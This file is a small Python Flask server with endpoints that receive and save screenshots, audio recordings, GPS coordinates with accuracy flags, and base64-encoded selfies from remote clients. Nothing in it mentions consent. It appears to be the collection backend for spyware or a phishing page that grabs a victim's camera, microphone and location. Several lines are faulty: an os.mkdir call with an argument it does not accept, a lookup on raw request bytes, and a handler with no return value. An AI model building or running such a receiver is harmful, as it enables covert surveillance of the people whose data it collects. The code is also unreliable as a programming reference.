from flask import Flask,request
import os
from datetime import datetime
import base64
app = Flask(__name__)
upload_folder = "screenshots"
os.makedirs(upload_folder,exist_ok=True)
os.mkdir("pictures",exist_ok=True)
@app.route('/upload-picture',methods=["POST"])
def upload_picture():
    if "image" not in request.files:
        return "No Images",400
    image = request.files["image"]
    filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".png"
    path = os.path.join(upload_folder,filename)
    image.save(path)
    return "OK", 200
@app.route("/upload-audio", methods=["POST"])
def upload_audio():
    if "audio" not in request.files:
        return "No audio", 400
    audio = request.files["audio"]
    filename = datetime.now().strftime("%Y%m%d_%H%M%S") + ".wav"
    path = os.path.join("audio", filename)
    os.makedirs("audio", exist_ok=True)
    audio.save(path)
    return "OK", 200
@app.route('/get-location',methods=["POST"])
def get_location():
    location = request.data["location"]
    with open("locations.log",'a') as file:
        file.write(f"{"Accurate" if location["isStrict"] == True else "Not Accurate"}, ({location["lat"]},{location["lon"]}), Accurate: {location["accuracy"]}\n")
@app.route('/get-selfi',methods=["POST"])
def get_selfi():
    data = request.json
    image_data = data.get("image")
    count = len(os.listdir("pictures"))
    if image_data:
        with open(os.path.join("pictures", f"image_{count:03d}.jpg"), "wb") as f:
            f.write(base64.b64decode(image_data))
        return "OK", 200
    return "failed", 400
if __name__ == "__main__":
    app.run(host="0.0.0.0",port=2020)